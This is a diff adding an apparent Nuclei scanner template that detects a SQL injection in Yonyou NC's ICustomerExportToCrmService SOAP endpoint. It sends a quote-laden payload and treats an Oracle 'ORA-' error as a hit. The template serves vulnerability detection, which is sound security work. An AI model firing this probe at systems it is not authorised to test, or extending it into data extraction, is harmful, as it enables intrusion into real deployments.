@@ -1,0 +1,38 @@
+id: yonyou-nc-icustomerexporttocrmservice-sqli
+
+info:
+  name: 用友NC ICustomerExportToCrmService SQL注入
+  author: SleepingBag945
+  severity: high
+
+
+http:
+  - raw:
+      - |
+        POST /uapws/service/nc.itf.bd.crm.ICustomerExportToCrmService HTTP/1.1
+        User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        SOAPAction: urn:exportCustomerToCrm
+        Content-type: text/xml;charset=UTF-8
+        Host: {{Hostname}}
+        Connection: close
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:icus="http://crm.bd.itf.nc/ICustomerExportToCrmService">
+          <soapenv:Header/>
+          <soapenv:Body>
+              <icus:exportCustomerToCrm>
+                <!--type: string-->
+                <string>
+                  test'
+                </string>
+              </icus:exportCustomerToCrm>
+          </soapenv:Body>
+        </soapenv:Envelope>
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body,"ORA-") && status_code==500
+          
